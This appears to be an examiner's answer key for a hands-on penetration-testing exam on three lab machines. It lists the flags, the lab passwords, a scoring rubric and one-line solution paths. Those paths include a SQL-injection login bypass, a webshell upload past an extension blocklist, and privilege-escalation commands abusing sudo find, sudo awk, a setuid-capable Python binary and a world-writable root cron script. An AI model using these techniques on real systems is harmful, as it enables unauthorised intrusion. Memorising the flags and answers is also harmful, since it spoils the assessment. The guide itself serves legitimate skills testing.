# EXAMINER GUIDE — do not share with candidates

## Flags

| Box | user flag | root flag |
|-----|-----------|-----------|
| m1-recovery | `FLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}` | `FLAG{sud0_f1nd_g1v3s_r00t}` |
| m2-webwork  | `FLAG{upl04d_t0_w3bsh3ll_w1n}`    | `FLAG{cr0n_w0rld_wr1t4bl3_pwn}` |
| m3-gauntlet | `FLAG{sqli_dump_crack_login}`     | `FLAG{c4p_s3tu1d_pyth0n_r00t}` |

## Known credentials / secrets (for your reference)

| Box | account | secret | how candidate gets it |
|-----|---------|--------|-----------------------|
| m1 | `jdoe` (SSH) | `sunshine2019` | carved from the deleted file in `disk_backup.img` |
| m2 | `appuser` (DB) / `webdev` (SSH) | `Summer#Breeze88` | read from `admin/config.php` via webshell; reused by `webdev` |
| m3 | `mbrown` (SSH) | `chocolate` | crack MD5 dumped from `devhub.users` |
| m3 | `svc` | random (unknown) | reached only via `sudo -u svc awk ...` |

## One-line solution path per box

- **m1:** nmap → HTTP/FTP → download `disk_backup.img` → `strings`/`photorec`/`foremost`
  recovers deleted `credentials.txt` (**user flag** + jdoe pass) → SSH jdoe →
  `sudo find . -exec /bin/sh \; -quit` → `cat /root/root.txt` (**root flag**).
- **m2:** nmap → gobuster finds `/admin/` → SQLi bypass `admin' -- -` → upload
  `shell.phtml` (blocklist misses `.phtml`) → www-data shell → read `config.php`
  creds → `su webdev` → **user flag** → overwrite world-writable
  `/opt/scripts/backup.sh` (root cron, 1-min) with `chmod +s /bin/bash` →
  `bash -p` → **root flag**.
- **m3:** nmap → `search.php?q=` SQL injection → sqlmap dumps `devhub.users` →
  crack `mbrown` MD5 (`chocolate`, rockyou) → SSH mbrown → **user flag** →
  `sudo -l` shows `(svc) NOPASSWD /usr/bin/awk` → `sudo -u svc awk 'BEGIN{system("/bin/sh")}'`
  → as svc, `getcap -r / 2>/dev/null` finds `/usr/local/bin/python3cap cap_setuid+ep`
  → `python3cap -c 'import os;os.setuid(0);os.system("/bin/bash")'` → **root flag**.

Full step-by-step with exact commands: `mN-*/SOLUTION.md`.

---

## Scoring rubric (your spec 5.3 — yes, this is doable)

Score each box out of **100**, then weight by difficulty for a final number.

### Per-box points (100)
| Phase | Points | What earns them |
|-------|-------:|-----------------|
| Enumeration | 15 | found all services/endpoints, not just lucky guesses |
| Foothold / initial access | 25 | reached a shell or valid creds by the intended (or a valid alt) path |
| **User flag** | 20 | submitted correct `user` flag |
| Privilege escalation | 20 | identified and exploited the privesc vector |
| **Root flag** | 20 | submitted correct `root` flag |

### Final weighting (reflects easy → medium)
`final = 0.25*m1 + 0.35*m2 + 0.40*m3`  (out of 100)

### Suggested bands
| Final | Read |
|------:|------|
| 85–100 | Strong. Rooted all three cleanly; good methodology. |
| 65–84 | Solid. Rooted most; minor gaps or needed nudges. |
| 45–64 | Developing. Footholds + some flags; privesc shaky. |
| < 45 | Not ready for unsupervised work yet. |

### Signals worth noting by hand (beyond points)
- Did they understand **why** each exploit worked, or just run tools blindly?
- Time management — stuck in a rabbit hole vs. pivoting.
- Did they avoid touching anything off-target?
- Clear notes / could they explain their steps back to you?

> Tip: ask them to narrate or drop short notes as they go. For real team work,
> the explanation is a better signal than the flag itself.
